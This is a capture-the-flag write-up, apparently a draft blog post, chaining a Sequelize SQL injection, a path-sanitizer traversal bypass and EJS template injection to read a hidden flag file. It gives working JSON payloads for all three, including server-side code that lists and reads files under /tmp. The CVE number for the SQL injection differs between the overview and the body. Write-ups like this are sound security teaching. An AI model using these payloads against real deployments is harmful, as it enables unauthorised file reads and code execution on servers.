---
title: "Dojo #45 - Chainfection"
date: 2025-12-04T00:54:24Z
categories: [ "writeup" ]
draft: true
---

## Overview
The target is a small file-sharing web application that accepts a JSON provided by the user. Two known vulnerabilities in outdated Node packages were chained to obtain the flag
- SQL injection in `sequelize` version `6.19.0` (CVE-2023-2581)
- Path traversal in `path-sanitizer` version `2.0.0` (CVE-2024-56198)

The SQL injection is used to bypass a database validation that checks verified users, so we can reach the code path that writes attacker-controlled content into a server file location. Then, the path traversal vulnerability is exploited to force the application to write into the server's `index.ejs` template file. Because EJS renders `index.ejs`, a crafted payload stored in that file executes during rendering and returns the flag. 


## Code Analysis
The code provided included a setup script and the main application script. I'll only include snippets of code needed to understand the vulnerabilities.

### Setup script
At the top of the code the app requires:
- `sequelize`, used as the ORM to query SQLite databases.
- `path-sanitizer`, used to sanitize file paths.

```javascript
const {Sequelize, DataTypes, Op, literal} = require_v("sequelize", "6.19.0");
const psanitize = require_v("path-sanitizer", "2.0.0");
```

The setup runs **before every request**, so the environment, including the flag filename, is recreated per request. This is important because we must discover the filename and access it during the same request since we can't predict it ahead of time.

The script creates `/tmp/view/user/files` and writes a flag file with a randomly generated name:

```javascript
process.chdir("/tmp");
fs.mkdirSync("view");
fs.mkdirSync("user/files",  { recursive: true });

fs.writeFileSync(`flag_${crypto.randomBytes(16).toString('hex')}.txt`, flag);
fs.writeFileSync('user/files/document.txt', 'test');
```

An in-memory sqlite database is created and two users are inserted. 

```javascript
async function init() {
    await sequelize.sync();
    // insert users
    await Users.create({
      name: "brumens",
      verify: true,
      attachment: "document.txt",
    });
    await Users.create({
      name: "leet",
      verify: false,
      attachment: "",
    });
}
```


### App script
The app parses the JSON input with required keys
```javascript
  // Required keys
  const requiredKeys = [
    "username",
    "updatedat",
    "attachment",
    "content"
  ];
```

Then the app updates user `id = 2` with the submitted `attachment`. As we previously saw in the setup script, this user is `leet`
```javascript
await Users.update(
      { attachment: data.attachment },
      {
        where: {
          id: 2,
        },
      }
    );

```

After the update, it runs a `findOne` query with three conditions:
1. The `updatedAt` date portion, which is a timestamp field created and managed by Sequelize, must be greater than or equal to the `data.updatedat` value passed by the user.
2. The user's name must exactly match `data.username`
3. The user's `verify` field from the database must be `true`.

```javascript
// Get user from database
    const user = await Users.findOne({
      where: {
        [Op.and]: [
          sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
        ],
      },
      replacements: { updatedat: data.updatedat },
    })

```
Only `brumens` matches by default since `leet` has `verify = false`.

If a matching user is returned, the server builds a file path and writes `data.content` to that path after being sanitized with `psanitize`. 

```javascript
// Sanitize the attachment file path
    const file = `/tmp/user/files/${psanitize(user.attachment)}`

    // Write the attachment content to the sanitized file path
    fs.writeFileSync(file, data.content)
```

Finally the app renders the template:
```javascript
 // Render the view
  console.log(ejs.render(fs.readFileSync('/tmp/view/index.ejs', "utf-8"), { filename: path.basename(filename), error: error }))
```

## Exploitation
Let's look at this from the bottom up. The goal is to obtain the flag, which is stored in a file under `/tmp` with a name we don't know beforehand.

There’s no direct file-read primitive, but we can control the filename (`attachment`) and the file contents via the JSON input. The server also renders `/tmp/view/index.ejs`, so if we can get the app to read the flag file and write its contents into `index.ejs`, the rendered output will reveal the flag.

Before we can do that, we must make the database query return the row whose attachment we control. We can control `username` and `updatedat` in the query, so we need to manipulate those parameters to force the query to return the desired user.


### SQLi
Searching for the `sequelize` library version `6.19.0` led me to [CVE-2023-25813](https://github.com/advisories/GHSA-wrh9-cjv3-2hpw) which describes a pattern vulnerable to SQLi. Specifically when a parameter is passed directly to the `where` option in a query and then another parameter is passed via `replacements`. This vulnerable version and pattern was found in the application, in this piece of code

```javascript
    // Get user from database
    const user = await Users.findOne({
      where: {
        [Op.and]: [
          sequelize.literal(`strftime('%Y-%m-%d', updatedAt) >= :updatedat`),
          { name: data.username },
          { verify: true }
        ],
      },
      replacements: { updatedat: data.updatedat },
    })
```

By injecting into `updatedat` and setting the username to `:updatedat` I was able to trigger a sequilize database error which confirms it's vulnerable


![](/images/dojo45/00-SQLiError.png)


I used a local script to inspect how Sequelize builds the query and to find a payload that returns the `leet` user. Why `leet`? Because `leet` is the row whose `attachment` is updated from the input and therefore controls the file path used by the app.

This is an example log showing the constructed query when injecting `updatedat`:


```bash
$ node test-sql.js    
Executing (default): CREATE TABLE IF NOT EXISTS `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `verify` TINYINT(1), `attachment` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL);
Executing (default): PRAGMA INDEX_LIST(`Users`)
Executing (default): INSERT INTO `Users` (`id`,`name`,`verify`,`attachment`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5);
Executing (default): INSERT INTO `Users` (`id`,`name`,`verify`,`attachment`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5);

=== Testing the vulnerable query ===

Executing (default): SELECT `id`, `name`, `verify`, `attachment`, `createdAt`, `updatedAt` FROM `Users` AS `User` WHERE (strftime('%Y-%m-%d', updatedAt) >= ' OR true);--' AND `User`.`name` = '' OR true);--'' AND `User`.`verify` = 1) LIMIT 1;

=== Query Result ===
{
  id: 1,
  name: 'brumens',
  verify: true,
  attachment: 'document.txt',
  createdAt: 2025-10-10T19:06:49.528Z,
  updatedAt: 2025-10-10T19:06:49.528Z
}
```

After a few tries, I finally obtain the user `leet` by using the following payload which effectively removes the `verify = true` restriction and returns the `leet` user

```json
username: ":updatedat",
updatedat: "OR 1 AND `User`.`Verify` = 0)--"
```

Now, on to the next part, exploiting the Path Traversal to force the application to store the `data.content` on the `index.ejs`

### Path Traversal
The `path-sanitizer` version `2.0.0` is vulnerable to [CVE-2024-56198](https://github.com/advisories/GHSA-94p5-r7cc-3rpr). The payload `..=%5c` can be used to bypass the sanitizer and perform a path traversal. This allows us to write to `/tmp/view/index.ejs` instead of writing in a file inside `/tmp/user/files` .

By setting the `attachment` for the user `leet` to a traversal path that bypasses the sanitizer and writing an EJS payload into `content`, the application writes our payload to /tmp/view/index.ejs.

First I used a payload to list `/tmp` and confirm it works:

```json
{
  "username": ":updatedat",
  "updatedat": "OR 1 AND `User`.`Verify` = 0)--",
  "attachment": "..=%5c..=%5cview/index.ejs",
  "content": "<%= this.constructor.constructor('return process')().mainModule.require('fs').readdirSync('/tmp') %>"
}
```

This rendered output included the `flag_` filename.

![](/images/dojo45/05-SSTI.png)


Finally, because the flag filename is different every run, I used a payload that finds the flag_ file and reads it in the same request:

```json
{
  "username": ":updatedat",
  "updatedat": "OR 1 AND `User`.`Verify` = 0)--",
  "attachment": "..=%5c..=%5cview/index.ejs",
  "content": "<%= this.constructor.constructor('return process.mainModule.require(\"fs\").readFileSync(\"/tmp/\" + process.mainModule.require(\"fs\").readdirSync(\"/tmp\").find(f => f.startsWith(\"flag_\")), \"utf-8\")')() %>"
}
```

When the server rendered `/tmp/view/index.ejs` after this write, the template executed the code, located the `flag_` file and printed the flag .

![](/images/dojo45/07-Flag.png)



